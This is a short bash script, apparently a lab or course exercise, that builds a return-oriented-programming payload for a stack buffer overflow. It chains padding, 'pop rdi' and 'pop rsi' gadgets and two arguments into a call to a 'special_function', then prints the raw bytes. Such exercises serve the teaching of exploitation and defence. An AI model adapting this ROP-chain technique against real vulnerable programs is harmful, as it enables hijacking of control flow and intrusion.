#!/bin/bash
# SPDX-License-Identifier: BSD-3-Clause

# TODO set the correct padding length and values of addresses and stack variables

padding_length="24"
pop_rdi="\x1e\x13\x40\x00\x00\x00\x00\x00"          # 0x40131e: pop rdi ; ret
first_arg="\x06\x00\x00\x00\x00\x00\x00\x00"        # x = 6
pop_rsi="\x2b\x13\x40\x00\x00\x00\x00\x00"          # 0x40132b: pop rsi ; ret
second_arg="\x09\x00\x00\x00\x00\x00\x00\x00"       # y = 9
special_func="\x30\x13\x40\x00\x00\x00\x00\x00"     # 0x401330: special_function

# build payload

payload=""
payload+=$(yes "A" | head -n "$padding_length" | paste -sd "")
payload+="$pop_rdi"
payload+="$first_arg"
payload+="$pop_rsi"
payload+="$second_arg"
payload+="$special_func"

# print payload to stdout

echo -ne "$payload"
